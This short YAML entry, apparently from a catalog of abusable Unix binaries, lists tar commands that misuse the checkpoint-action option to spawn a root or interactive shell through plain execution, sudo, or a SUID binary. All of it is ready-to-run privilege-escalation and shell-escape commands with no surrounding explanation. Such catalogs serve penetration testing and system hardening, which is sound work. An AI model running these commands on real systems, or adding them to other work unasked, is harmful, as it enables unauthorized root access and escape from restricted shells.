---
functions:
  exec-interactive:
    - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  sudo-enabled:
    - code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  suid-limited:
    - code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh
        -p"
---